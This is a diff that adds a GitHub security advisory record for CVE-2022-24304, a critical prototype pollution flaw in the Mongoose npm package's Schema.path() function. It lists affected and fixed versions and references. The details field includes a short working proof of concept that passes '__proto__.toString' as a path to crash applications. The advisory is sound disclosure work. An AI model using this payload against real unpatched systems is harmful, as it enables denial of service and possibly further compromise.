@@ -1,0 +1,92 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-h8hf-x3f4-xwgp",
+  "modified": "2024-04-22T23:17:47Z",
+  "published": "2022-08-27T00:00:54Z",
+  "aliases": [
+    "CVE-2022-24304"
+  ],
+  "summary": "Mongoose Vulnerable to Prototype Pollution in Schema Object",
+  "details": "### Description\nMongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The `Schema.path()` function is vulnerable to prototype pollution when setting the `schema` object. This vulnerability allows modification of the Object prototype and could be manipulated into a Denial of Service (DoS) attack.\n\n### Proof of Concept\n```js\n// poc.js\nconst mongoose = require('mongoose');\nconst schema = new mongoose.Schema();\n\nmalicious_payload = '__proto__.toString'\n\nschema.path(malicious_payload, [String])\n\nx = {}\nconsole.log(x.toString()) // crashed (Denial of service (DoS) attack)\n```\n\n### Impact\nThis vulnerability can be manipulated to exploit other types of attacks, such as Denial of service (DoS), Remote Code Execution, or Property Injection.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "mongoose"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "6.0.0"
+            },
+            {
+              "fixed": "6.4.6"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "mongoose"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.13.15"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24304"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Automattic/mongoose/issues/12085"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Automattic/mongoose/commit/6a197316564742c0422309e1b5fecfa4faec126e"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Automattic/mongoose/commit/a45cfb6b0ce0067ae9794cfa80f7917e1fb3c6f8"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Automattic/mongoose/blob/51e758541763b6f14569744ced15cc23ab8b50c6/lib/schema.js#L88-L141"
+    },
+    {
+      "type": "WEB",
+      "url": "https://huntr.dev/bounties/055be524-9296-4b2f-b68d-6d5b810d1ddd"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-1321"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-04-22T23:17:47Z",
+    "nvd_published_at": "2022-08-26T05:15:00Z"
+  }
+}
